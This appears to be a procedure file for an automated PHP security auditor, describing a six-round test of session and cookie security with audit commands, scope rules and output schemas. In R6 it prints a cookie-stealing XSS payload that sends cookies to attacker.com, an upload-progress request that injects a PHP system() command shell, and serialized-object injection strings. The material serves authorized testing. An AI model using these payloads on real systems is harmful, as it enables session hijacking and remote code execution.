## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-058-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute 6-round progressive attack against session/cookie security sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |

## 🚨 CRITICAL Rules

| # | Rule | Consequence |
|---|------|-------------|
| CR-1 | Every `confirmed` verdict MUST have physical HTTP evidence: request URL + method + payload + response status + observable outcome | FAIL — evidence fabrication, finding rejected by QC |
| CR-2 | MUST NOT exceed 6 attack rounds — if stuck after round 4, execute Smart Pivot or Smart Skip | FAIL — resource exhaustion, blocks other auditors |
| CR-3 | MUST NOT attack routes not assigned in the task package — stay within allocated sink scope | FAIL — scope violation, duplicate work with other auditors |
| CR-4 | MUST read `$WORK_DIR/attack_plans/{sink_id}_plan.json` from Stage-1 before starting — do NOT re-analyze from scratch | FAIL — ignores Stage-1 analysis, wastes rounds on already-assessed vectors |
| CR-5 | MUST write exploit result to `$WORK_DIR/exploits/{sink_id}.json` conforming to `schemas/exploit_result.schema.json` | FAIL — downstream QC and report generation cannot process non-conformant output |
| CR-6 | MUST demonstrate session fixation/hijacking by achieving authenticated access using victim's session token from a different client | FAIL — same-client session reuse does not prove vulnerability |

## 6-Round Attack Strategy
**Payload Selection Rule (CR-PAYLOAD)**:

Within each round, test payloads in the following priority order:

| Priority | Condition | Action |
|----------|-----------|--------|
| 1 (try first) | Simplest/most direct payload for this technique | Test baseline vulnerability existence |
| 2 | Encoding/evasion variant of Priority 1 | Test if filters block Priority 1 |
| 3 | Framework-specific or context-adaptive payload | Test framework-aware bypasses |
| 4 (try last) | Complex/chained payload | Test advanced exploitation |

- MUST test Priority 1 before trying Priority 2-4
- If Priority 1 succeeds → record evidence and proceed to next round (do NOT test remaining payloads)
- If Priority 1 fails → try Priority 2, then 3, then 4
- If ALL priorities fail → fill Round Fill-in with `failure_reason` and proceed to next round
- MUST NOT skip Priority 1 to try "creative" payloads directly



#### R1 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| payload | `{payload from this round's strategy — must match selected_priority}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R1 - Session Fixation Attack

Static Analysis:
```bash
# Search for session_start() calls and context
grep -rn "session_start\s*()" \
  $TARGET_PATH/ --include="*.php" -A 5

# Search for session_regenerate_id in login logic
grep -rn "session_regenerate_id" \
  $TARGET_PATH/ --include="*.php"

# Search for authentication state change points (login/privilege escalation)
grep -rn "login\|authenticate\|auth\|sign_in\|doLogin" \
  $TARGET_PATH/ --include="*.php" | \
  grep -i "function\|def\|public\|protected\|private"

# Search for session.use_strict_mode configuration
grep -rn "use_strict_mode\|use_only_cookies\|use_trans_sid" \
  $TARGET_PATH/ --include="*.php" --include="*.ini" --include=".htaccess"

# Framework-specific: Laravel Session regenerate
grep -rn "Session::regenerate\|session()->regenerate\|->regenerate()" \
  $TARGET_PATH/ --include="*.php"

# Framework-specific: Symfony Session migrate
grep -rn "->migrate(\|->invalidate(" \
  $TARGET_PATH/ --include="*.php"
```

Dynamic Verification:
1. **URL Parameter Session ID Injection**:
   ```
   GET /login?PHPSESSID=attacker_controlled_session_id_12345 HTTP/1.1
   ```
   - Confirm whether the Session ID in the URL is accepted when `session.use_only_cookies = 0` by sending a request
2. **Cookie Injection with Pre-set ID**:
   ```
   Cookie: PHPSESSID=attacker_fixed_session_id_67890
   ```
   - Steps: (1) Attacker sets a known Session ID → (2) Victim logs in using that ID → (3) Attacker uses the same ID to gain authenticated status
3. **CRLF Injection Chain**:
   - Inject `Set-Cookie: PHPSESSID=attacker_id` through a Header injection point
   - Use in conjunction with R1's CRLF findings
4. **Post-Fixation Audit**:
   - Record Session ID before login → Compare again after login
   - If ID unchanged → Confirm Session Fixation by comparing IDs
   - If `session_regenerate_id(false)` instead of `(true)` → Old Session data persists
5. **Framework Audit**:
   - Laravel: Does `Auth::login()` automatically call `$request->session()->regenerate()`
   - Symfony: Does `AuthenticationSuccessHandler` call `$session->migrate(true)`
   - CodeIgniter: Is `sess_regenerate()` called after login

**Evidence:** The attacker's pre-set Session ID remains valid after the victim logs in, and the attacker can use that ID to access the victim's authenticated Session.


#### R2 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R2 - Cookie Security Flag Audit

Static Analysis:
```bash
# Search for session_set_cookie_params configuration
grep -rn "session_set_cookie_params\|session\.cookie" \
  $TARGET_PATH/ --include="*.php" --include="*.ini" --include=".htaccess"

# Search for setcookie/setrawcookie calls and parameters
grep -rn "setcookie\s*(\|setrawcookie\s*(" \
  $TARGET_PATH/ --include="*.php" -A 3

# Search for header directly setting Cookie
grep -rn "header\s*(\s*['\"]Set-Cookie" \
  $TARGET_PATH/ --include="*.php"

# Search for Cookie security configuration in php.ini
grep -rn "cookie_httponly\|cookie_secure\|cookie_samesite\|cookie_lifetime\|cookie_path\|cookie_domain" \
  $TARGET_PATH/ --include="*.ini" --include=".htaccess" --include="*.php"

# Framework config: Laravel session config
grep -rn "httponly\|secure\|same_site\|domain\|path\|lifetime" \
  $TARGET_PATH/config/session.php 2>/dev/null

# Framework config: Symfony session config
grep -rn "cookie_httponly\|cookie_secure\|cookie_samesite" \
  $TARGET_PATH/config/packages/framework.yaml 2>/dev/null
```

Dynamic Verification:
1. **HttpOnly Flag Audit**:
   - Send a request and capture the `Set-Cookie` response header
   - Missing `HttpOnly` → XSS can steal the Cookie
   - Confirm whether the Session Cookie can be read by executing `document.cookie`
2. **Secure Flag Audit**:
   - Analyze whether `Set-Cookie` includes the `Secure` attribute
   - Missing `Secure` → Cookie transmitted in plaintext over HTTP (man-in-the-middle attack)
   - Confirm whether the Cookie is sent over an HTTP connection by sending a request
3. **SameSite Attribute Audit**:
   - `SameSite=None` → Cookie sent with cross-site requests (CSRF risk)
   - `SameSite=Lax` → Only sent with top-level navigation (GET) (recommended minimum standard)
   - `SameSite=Strict` → Never sent cross-site (most secure but may affect functionality)
   - Missing SameSite → Browser default behavior (Chrome 80+ defaults to Lax)
4. **Path Scope Audit**:
   - `Path=/` → Cookie visible across the entire domain (may leak to unrelated paths)
   - Verify whether the Cookie is restricted to the application path
5. **Domain Scope Audit**:
   - `Domain=.example.com` → Visible to all subdomains (subdomain takeover risk)
   - Domain not set → Exact match of current domain (more secure)
6. **Lifetime Audit**:
   - `session.cookie_lifetime = 0` → Expires when browser closes (secure)
   - Excessively long lifetime (> 86400) → Larger window for persistent Cookie theft
7. **Configuration Conflict Detection**:
   - php.ini sets `session.cookie_httponly = 1` but code overrides with `session_set_cookie_params(['httponly' => false])`
   - Framework configuration conflicts with php.ini

**Evidence:** HTTP response header `Set-Cookie: PHPSESSID=xxx` is missing HttpOnly/Secure/SameSite attributes.


#### R3 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R3 - Session ID Strength Analysis

Static Analysis:
```bash
# Search for Session ID length configuration
grep -rn "sid_length\|sid_bits_per_character\|entropy_length\|hash_function" \
  $TARGET_PATH/ --include="*.php" --include="*.ini" --include=".htaccess"

# Search for custom Session ID generation
grep -rn "session_id\s*(" $TARGET_PATH/ --include="*.php" | \
  grep -v "session_id()" | grep "session_id\s*(\s*\$"

# Search for use_strict_mode configuration
grep -rn "use_strict_mode" \
  $TARGET_PATH/ --include="*.php" --include="*.ini"

# Search for custom Session Handler's create_sid implementation
grep -rn "create_sid\|function.*sid\|generateId" \
  $TARGET_PATH/ --include="*.php"
```

Dynamic Verification:
1. **Session ID Entropy Analysis**:
   - Collect 30+ Session IDs
   ```bash
   for i in $(seq 1 30); do
     curl -s -I "$TARGET_URL/" | grep "PHPSESSID" | \
       sed 's/.*PHPSESSID=//' | sed 's/;.*//'
   done > session_ids.txt
   ```
   - Calculate Shannon entropy: ideal value ≥ 4.0 bits/character
   - Analyze length: PHP 7.1+ defaults to `sid_length=32`, recommended ≥ 48
   - Analyze character set: `sid_bits_per_character` 4(0-9a-f) / 5(0-9a-v) / 6(0-9a-zA-Z,-) 

2. **Pattern Detection**:
   - Sort Session IDs and analyze sequential/incremental patterns
   - Compare whether prefixes/suffixes are fixed
   - Analyze time correlation (whether IDs generated within the same second are similar)
   
3. **Strict Mode Testing**:
   - Send a non-existent Session ID: `Cookie: PHPSESSID=nonexistent_id_99999`
   - `use_strict_mode = 0` → Server accepts the ID (creates new Session using this ID)
   - `use_strict_mode = 1` → Server rejects it, assigns a new ID
   ```bash
   curl -v -b "PHPSESSID=test_strict_mode_check" "$TARGET_URL/" 2>&1 | \
     grep "Set-Cookie"
   ```

4. **Custom ID Generator Security**:
   - If `session_id(custom_value)` is used to manually set the ID
   - Analyze the generation logic of `custom_value` (whether `random_bytes()` is used)
   - If based on user input or predictable values → Critical risk

**Evidence:** Collected Session IDs exhibit predictable patterns, or `use_strict_mode = 0` allows arbitrary Session IDs to be accepted.


#### R4 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R4 - Session Storage Security

Static Analysis:
```bash
# Search for Session storage Handler
grep -rn "session\.save_handler\|session\.save_path\|session_set_save_handler" \
  $TARGET_PATH/ --include="*.php" --include="*.ini" --include=".htaccess"

# Search for SessionHandlerInterface implementations
grep -rn "SessionHandlerInterface\|SessionHandler\|implements.*Handler" \
  $TARGET_PATH/ --include="*.php"

# Search for Session serialization configuration
grep -rn "serialize_handler\|session_encode\|session_decode" \
  $TARGET_PATH/ --include="*.php" --include="*.ini"

# Search for framework Session driver configuration
grep -rn "SESSION_DRIVER\|session_driver\|'driver'\s*=>" \
  $TARGET_PATH/ --include="*.php" --include="*.env*"

# Search for Redis/Memcached connection configuration (authentication and TLS)
grep -rn "redis.*session\|memcached.*session\|REDIS_PASSWORD\|REDIS_HOST" \
  $TARGET_PATH/ --include="*.php" --include="*.env*" --include="*.ini"
```

Dynamic Verification:
1. **File Handler Permission Audit**:
   ```bash
   # Check Session file directory permissions
   ls -la /tmp/sess_* 2>/dev/null | head -10
   stat -c "%a %U %G" /tmp/ 2>/dev/null || stat -f "%Lp %Su %Sg" /tmp/
   
   # Shared hosting: check if other users' Session files are readable
   find /tmp -name "sess_*" -not -user $(whoami) -readable 2>/dev/null
   ```
   - File permission `0600` → Secure (owner read/write only)
   - File permission `0644` → Critical risk (readable by other users)
   - `/tmp` directory without sticky bit → Critical risk

2. **Database Handler Audit**:
   - Whether Session data is encrypted at rest (plaintext vs AES encryption)
   - Whether the Session table has proper access controls
   - Whether Session data contains sensitive information (plaintext passwords, Tokens)

3. **Redis/Memcached Security**:
   - Whether authentication password is configured (Redis `requirepass`)
   - Whether TLS encrypted connections are used (`rediss://` scheme)
   - Whether bound to localhost or private network
   - Whether Memcached is exposed to the public network (no authentication protocol)

4. **Serialization Security Audit**:
   - `session.serialize_handler = php` vs `php_serialize`
   - Mixing two handlers → Deserialization injection vulnerability
   ```
   # php handler format: key|s:5:"value";
   # php_serialize format: a:1:{s:3:"key";s:5:"value";}
   # When mixed, can construct: |O:8:"Exploit":0:{}
   ```
   - Search for exploitable `__wakeup()` / `__destruct()` magic methods (POP chains)

5. **Session Data Content Audit**:
   - Analyze whether `$_SESSION` stores data that SHOULD NOT be stored:
     - Plaintext passwords / API keys
     - Complete user objects (including password hashes)
     - Excessive permission data (permission bloat)

**Evidence:** Session file permissions are `0644` (world-readable), or Redis Session storage has no password authentication.


#### R5 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R5 - Session Destruction Integrity

Static Analysis:
```bash
# Search for logout/signout functions
grep -rn "function.*logout\|function.*signout\|function.*sign_out\|function.*logOut" \
  $TARGET_PATH/ --include="*.php" -A 20

# Search for session_destroy calls
grep -rn "session_destroy\|session_unset" \
  $TARGET_PATH/ --include="*.php"

# Search for Cookie deletion operations
grep -rn "setcookie.*PHPSESSID\|setcookie.*session\|setcookie.*''\|setcookie.*\"\"\|time\s*()\s*-" \
  $TARGET_PATH/ --include="*.php"

# Framework: Laravel logout
grep -rn "Auth::logout\|auth()->logout\|->logout()" \
  $TARGET_PATH/ --include="*.php"

# Search for "remember me" Token cleanup
grep -rn "remember.*token\|remember_token\|persistent.*login\|auto.*login" \
  $TARGET_PATH/ --include="*.php"

# Search for concurrent Session management
grep -rn "session.*limit\|concurrent.*session\|active.*session\|max.*session" \
  $TARGET_PATH/ --include="*.php"
```

Dynamic Verification:
1. **Complete Logout Flow Testing**:
   - Step 1: Log in and record the Session ID
   - Step 2: Execute the Logout operation
   - Step 3: Attempt to access a protected page using the old Session ID
   ```bash
   # Log in to obtain Session ID
   SESSION_ID=$(curl -s -c - "$TARGET_URL/login" -d "user=test&pass=test" | \
     grep PHPSESSID | awk '{print $NF}')
   
   # Execute Logout
   curl -s -b "PHPSESSID=$SESSION_ID" "$TARGET_URL/logout"
   
   # Access protected page using old Session ID
   curl -s -b "PHPSESSID=$SESSION_ID" "$TARGET_URL/dashboard" -o /dev/null -w "%{http_code}"
   # 200 → Session not destroyed (vulnerability)
   # 302/401/403 → Session correctly destroyed
   ```

2. **Server-Side Session Data Audit**:
   - Check whether the Session file still exists after Logout:
   ```bash
   ls -la /tmp/sess_${SESSION_ID} 2>/dev/null
   ```
   - File exists and is non-empty → `session_destroy()` was not called or failed

3. **Client-Side Cookie Expiration Audit**:
   - Does the Logout response include a Cookie expiration header:
   ```
   Set-Cookie: PHPSESSID=deleted; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/; httponly
   ```
   - Missing → Browser retains old Cookie until user manually clears it

4. **"Remember Me" Token Rotation**:
   - Is the remember_token cleared/rotated in the database after Logout
   - Can the old remember_token still be used for auto-login

5. **Concurrent Session Limiting**:
   - Whether a single user is allowed to have multiple Sessions simultaneously
   - Whether a new login invalidates old Sessions
   - Whether administrators have the ability to force-logout other Sessions

6. **Incomplete Destruction Pattern Detection**:
   - Only `$_SESSION = array()` without `session_destroy()` → Session file still exists
   - Only `session_destroy()` without Cookie deletion → Client-side Cookie persists
   - Only `session_unset()` without `session_destroy()` → Session file persists

**Evidence:** Old Session ID can still access authenticated pages after Logout, or Session file is not deleted.


#### R6 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R6 - Advanced Session Attacks

Static Analysis:
```bash
# Search for Session-related output points (XSS → Session hijacking chain)
grep -rn "echo.*\$_SESSION\|print.*\$_SESSION\|<\?=.*\$_SESSION" \
  $TARGET_PATH/ --include="*.php"

# Search for session.upload_progress configuration
grep -rn "upload_progress\|session\.upload" \
  $TARGET_PATH/ --include="*.php" --include="*.ini"

# Search for Session variable name conflicts (Session Puzzling)
grep -rn "\$_SESSION\[" $TARGET_PATH/ --include="*.php" | \
  awk -F"'" '{print $2}' | sort | uniq -d

# Search for race condition risks in session_regenerate_id
grep -rn "session_regenerate_id" $TARGET_PATH/ --include="*.php" -B 5 -A 5

# Search for Session data used directly in security decisions
grep -rn "\$_SESSION\[.*role\|_SESSION\[.*admin\|_SESSION\[.*level\|_SESSION\[.*perm" \
  $TARGET_PATH/ --include="*.php"
```

Dynamic Verification:
1. **Session Hijacking (XSS → Cookie Theft)**:
   - Prerequisite: XSS vulnerability exists + Cookie lacks HttpOnly
   - Attack payload: `<script>new Image().src='//attacker.com/c='+document.cookie</script>`
   - Confirm by sending request: Whether the stolen Session ID can access the victim's Session
   - Defense audit: Whether Session-IP binding or User-Agent binding exists

2. **Session Donation Attack**:
   - Attacker logs into their own account and obtains a Session ID
   - Lures the victim into using the attacker's Session ID
   - Victim enters sensitive information (e.g., payment details) within the attacker's Session
   - Attacker subsequently accesses that Session to obtain the victim's data
   - Analysis: Whether the application detects Session ownership changes (IP/UA changes)

3. **Session Puzzling (Session Variable Confusion)**:
   - Different functional modules use the same `$_SESSION` key names
   - Example: Password reset flow sets `$_SESSION['verified'] = true`
   - Another feature reads `$_SESSION['verified']` as authorization basis
   - Bypass: Complete password reset verification → Access other features requiring `verified`
   ```bash
   # Collect all $_SESSION key names, find cross-function reuse
   grep -rn "\$_SESSION\[" $TARGET_PATH/ --include="*.php" | \
     sed "s/.*\$_SESSION\[['\"]\([^'\"]*\)['\"].*/\1/" | sort | uniq -c | sort -rn
   ```

4. **session_regenerate_id() Race Condition**:
   - Concurrent requests: Send multiple requests at the exact moment `session_regenerate_id()` executes
   - Old ID and new ID may briefly coexist
   - `session_regenerate_id(false)` → Old Session file not deleted (larger race window)
   ```bash
   # Concurrency test
   for i in $(seq 1 10); do
     curl -s -b "PHPSESSID=$OLD_ID" "$TARGET_URL/dashboard" &
   done
   wait
   ```

5. **PHP Session Upload Progress Abuse**:
   - `session.upload_progress.enabled = On` (enabled by default)
   - Attacker can write arbitrary `$_SESSION` data via file upload requests
   - Combined with LFI: Inject PHP code into Session files
   ```
   POST /upload.php HTTP/1.1
   Content-Type: multipart/form-data; boundary=----
   Cookie: PHPSESSID=target_session

   ------
   Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

   <?php system($_GET['cmd']); ?>
   ------
   ```
   - Then include via LFI: `?file=/tmp/sess_target_session`

6. **Session Deserialization Attack**:
   - When `session.serialize_handler` configuration is inconsistent:
     - Writing uses `php_serialize`, reading uses `php`
     - Attacker injects `|` separator + serialized object into `$_SESSION` values
   - Construct POP chains exploiting `__wakeup()` / `__destruct()` for arbitrary code execution
   - Analysis:
   ```bash
   # Search for different entry files' serialize_handler settings
   grep -rn "serialize_handler" $TARGET_PATH/ --include="*.php" --include="*.ini"

   # Search for exploitable magic methods
   grep -rn "__wakeup\|__destruct\|__toString\|__call" \
     $TARGET_PATH/ --include="*.php"
   ```

**Evidence:** Session Upload Progress successfully injects code and executes via LFI, or Session deserialization successfully triggers a POP chain.

## Evidence Collection

| Evidence Type | Example |
|---|---|
| Session Fixation | Pre-set `PHPSESSID=attacker123`, the ID remains valid after login and carries authenticated status |
| Cookie Flag Missing | Response header: `Set-Cookie: PHPSESSID=abc; path=/` (missing HttpOnly; Secure; SameSite) |
| Session ID Predictable | First 8 characters are identical across 30 IDs, Shannon entropy < 3.0 bits/char |
| Session Not Destroyed | After Logout, `curl -b "PHPSESSID=old_id" /dashboard` returns 200 |
| Insecure Storage | `/tmp/sess_abc` has permission `0644`, other users can read plaintext Session data |
| Deserialization Attack | Injected `|O:7:"Exploit":0:{}` into Session data, triggered `__destruct()` executing `phpinfo()` |
| Upload Progress | `PHP_SESSION_UPLOAD_PROGRESS` injects PHP code, LFI execution succeeds |

## Per-Round Record Format

```json
{
  "vuln_type": "Session_Security",
  "sub_type": "session_fixation|cookie_flags|session_id_strength|session_storage|session_destroy|advanced_attack",
  "round": 1,
  "location": "app/Http/Controllers/AuthController.php:87",
  "evidence": "session_regenerate_id() not called after login; attacker's pre-set Session ID remains valid after authentication",
  "confidence": "confirmed|highly_suspected|potential_risk",
  "impact": "Attacker can hijack user Session|Sensitive Cookie can be stolen|Session data can be tampered with",
  "remediation": "Call session_regenerate_id(true) after login, set HttpOnly/Secure/SameSite flags, enable strict_mode"
}
```

## Smart Skip

The following scenarios allow skipping the corresponding round:

| Condition | Skip Round | Reason |
|---|---|---|
| `session.use_strict_mode = 1` + `session_regenerate_id(true)` confirmed via code search | R1 | Fixation is effectively defended |
| All Cookies have HttpOnly + Secure + SameSite set | R2 | Cookie security flags are complete |
| PHP ≥ 7.1 + `sid_length ≥ 48` + `sid_bits_per_character = 6` | R3 | Session ID strength is sufficient |
| Encrypted database storage + no file handler | R4 | Storage security confirmed via analysis |
| Logout flow includes complete three steps (destroy + unset + cookie deletion) | R5 | Destruction flow is complete |
| No findings in rounds 1-5 + no LFI + no XSS synergy points | R6 | Advanced attacks lack prerequisites |

Skip reasons and verification basis MUST be recorded in `{sink_id}_plan.json` when skipping.

## Detection (Vulnerability Pattern Recognition)

The following code patterns indicate potential Session/Cookie security weaknesses:

- Pattern 1: `session_start()` without `session_regenerate_id()` at authentication state changes — Session ID not regenerated after login, privilege escalation, or role switching; Session Fixation risk
- Pattern 2: `setcookie('name', $value)` with only two parameters — Missing HttpOnly/Secure/SameSite security flags; Cookie can be stolen via XSS or transmitted in plaintext over HTTP
- Pattern 3: `session.cookie_httponly = 0` or `ini_set('session.cookie_httponly', 0)` — Explicitly disabling HttpOnly allows Session Cookie to be read by JavaScript
- Pattern 4: `session.use_strict_mode = 0` (default value) — Server accepts any arbitrary Session ID submitted by the client; attacker can pre-set ID for Fixation attack
- Pattern 5: `session.use_only_cookies = 0` — Allows Session ID to be passed via URL parameters (`?PHPSESSID=xxx`), increasing ID leakage and Fixation risk
- Pattern 6: Logout function missing `session_destroy()` — Only clears variables without destroying the Session file; old Session ID can still be reused
- Pattern 7: `session_set_cookie_params()` with default/weak parameters — `httponly`, `secure`, `samesite` parameters not specified; relies on php.ini defaults (typically insecure)
- Pattern 8: `$_SESSION['user_id'] = $id` immediately following login logic without `session_regenerate_id(true)` — Sets authentication info on old Session; classic Fixation pattern

## Key Insight

> **Key Point**: Session security is not a single-point issue but a lifecycle issue. Every stage from creation (`session_start()`) → binding (post-login `regenerate`) → usage (cookie flags) → destruction (logout) can have defects. The highest risks are Session Fixation (PHP does not enable strict mode by default; `session.use_strict_mode` defaults to `0`) and missing Cookie flags (`HttpOnly`/`Secure` require explicit configuration; PHP defaults both to off). When auditing, you MUST first analyze lifecycle integrity, then drill into each stage.

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger Smart Pivot:

1. Re-reconnaissance: Re-read target code to find missed filtering logic and alternative entry points
2. Cross-intelligence: Consult the shared findings database (`$WORK_DIR/audit_session.db`) for related findings from other experts
   - Cryptography auditor's weak randomness findings may affect Session ID strength
   - XSS auditor's reflected XSS can be used for Session hijacking chains
   - CRLF injection findings can be used for Cookie injection
3. Decision tree matching: Select a new attack direction based on failure patterns in `shared/pivot_strategy.md`
4. When no new paths exist, terminate early to avoid wasting rounds producing hallucinated results

## Prerequisites & Scoring (MUST be filled)

The output `exploits/{sink_id}.json` MUST include the following two objects:

### prerequisite_conditions
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST be consistent with the route's auth_level in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict SHALL be at most potential
- `other_preconditions` lists all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-Dimensional Scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-SESSION-001"
}
```
- All reason fields MUST contain specific justification and MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract Reference (EVID)

Every vulnerability conclusion MUST reference the following evidence points in the `evidence` field (refer to `shared/evidence_contract.md`):
- `EVID_SESS_CONFIG_STATE` — php.ini / runtime Session configuration items and their security level ✅ Required
- `EVID_SESS_COOKIE_FLAGS` — HttpOnly/Secure/SameSite/Path/Domain in actual Set-Cookie response headers ✅ Required
- `EVID_SESS_LIFECYCLE_FLOW` — Complete lifecycle code path for Session creation → authentication → usage → destruction ✅ Required
- `EVID_SESS_EXPLOIT_RESPONSE` — HTTP evidence of Session attacks (fixation success/cookie leakage/ID predictable) Required when confirmed

Missing required EVID → Conclusion automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Writing

After the attack cycle ends, write experience to the attack memory store (see `shared/attack_memory.md` write protocol for format):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write; SQLite WAL mode automatically ensures concurrency safety.

## Output

After completing all rounds, write the final results to `$WORK_DIR/exploits/{sink_id}.json`, following the format in `shared/data_contracts.md` Section 9 (`exploit.json`).

> The `## Per-Round Record Format` above is the internal per-round record format; the final output MUST be aggregated into the exploit.json structure.

## Collaboration

- Pass discovered Session Cookie configuration weaknesses to the configuration auditor
- Pass Session Fixation findings to the privilege escalation auditor (to assist with authentication bypass)
- Pass missing Cookie flags to the XSS auditor (missing HttpOnly → XSS can steal Cookies)
- Pass Session storage path information to the LFI auditor (LFI → Session file inclusion)
- Pass Session deserialization clues to the deserialization auditor (POP chain exploitation)
- Submit all findings to the QA reviewer for evidence verification

## Real-Time Sharing & Second-Order Tracking

### Shared Write
Discovered Session security weaknesses **MUST** be written to the shared findings database (`$WORK_DIR/audit_session.db`):
- Cookie flag missing → `finding_type: config_weakness`
- Session Fixation → `finding_type: auth_bypass`
- Session storage path/file → `finding_type: file_path` (for LFI auditor use)
- Session deserialization entry → `finding_type: deserialization_entry`

### Shared Read
Read the shared findings database before starting the attack phase, leveraging the following information:
- XSS vulnerability points → Used for Session hijacking chains (R6)
- CRLF injection points → Used for Cookie injection Fixation (R1)
- LFI vulnerability points → Used for Session Upload Progress attacks (R6)
- Weak randomness findings → Used for Session ID strength analysis (R3)

## Constraints

- MUST NOT modify server-side Session configuration (observe and test only)
- Session attack testing MUST only use test accounts; MUST NOT target real user Sessions
- Session file reading is ONLY for analyzing permission issues; MUST NOT extract real user data
- Concurrency testing MUST limit request count (≤ 50 requests/round) to avoid DoS
- Deserialization testing MUST use harmless payloads (e.g., `phpinfo()`); MUST NOT execute destructive operations
- Session Upload Progress testing MUST only analyze feasibility; MUST NOT actually deploy Webshells
- All Session IDs and Cookie values in evidence MUST be redacted in reports


## Output Contract

| File | Path | Format |
|------|------|--------|
| Exploit result | `$WORK_DIR/exploits/{sink_id}.json` | JSON per `shared/data_contracts.md` §9 |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Python PoC |

## Examples

### ✅ GOOD Output Example

```json
{
  "sink_id": "SESS-001",
  "vuln_type": "Session_Security",
  "sub_type": "session_fixation",
  "final_verdict": "confirmed",
  "rounds_executed": 3,
  "confirmed_round": 1,
  "location": "app/Http/Controllers/AuthController.php:87",
  "payload": "Cookie: PHPSESSID=attacker_fixed_id → victim logs in → attacker reuses same ID",
  "evidence": "EVID_SESS_CONFIG_STATE: session.use_strict_mode=0, session.use_only_cookies=1; EVID_SESS_COOKIE_FLAGS: Set-Cookie: PHPSESSID=xxx; path=/ (missing HttpOnly, Secure, SameSite); EVID_SESS_LIFECYCLE_FLOW: session_start() at bootstrap → no session_regenerate_id() in AuthController::login(); EVID_SESS_EXPLOIT_RESPONSE: Pre-set PHPSESSID=attacker123, after login curl -b PHPSESSID=attacker123 /dashboard returns HTTP 200 with user data",
  "confidence": "confirmed",
  "impact": "Session hijacking — attacker pre-sets Session ID and gains victim authenticated session",
  "prerequisite_conditions": { "auth_requirement": "anonymous", "exploitability_judgment": "conditionally_exploitable", "other_preconditions": ["Victim must visit attacker-controlled link"] },
  "severity": { "reachability": 2, "impact": 3, "complexity": 1, "score": 2.10, "cvss": 7.0, "level": "H" }
}
```

### ❌ BAD Output Example

```json
{
  "sink_id": "SESS-001",
  "vuln_type": "Session_Security",
  "final_verdict": "confirmed",
  "evidence": "session_regenerate_id() not found in code",
  "severity": { "level": "H" }
}
// ❌ Absence of function is code review finding, not exploitation proof
// ❌ No actual fixation test performed (pre-set ID → login → reuse)
// ❌ Missing cookie flags analysis
// ❌ severity missing scores and reasons
```


---

## Pre-Submission Self-Check (MUST be performed)

After completing the exploit JSON, perform self-check item by item per `shared/auditor_self_check.md`:

1. Execute the 8 general items (G1-G8); continue only after all are ✅
2. Execute the specialized checks below (S1-S3); submit only after all are ✅
3. If any item is ❌ → Correct and re-check; MUST NOT skip

### Specialized Self-Check (Session Auditor Specific)
- [ ] S1: Randomness of the Session ID generation algorithm has been analyzed
- [ ] S2: Specific attack vectors for Session fixation/hijacking have been identified
- [ ] S3: session.cookie_httponly/secure configuration has been confirmed via search

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
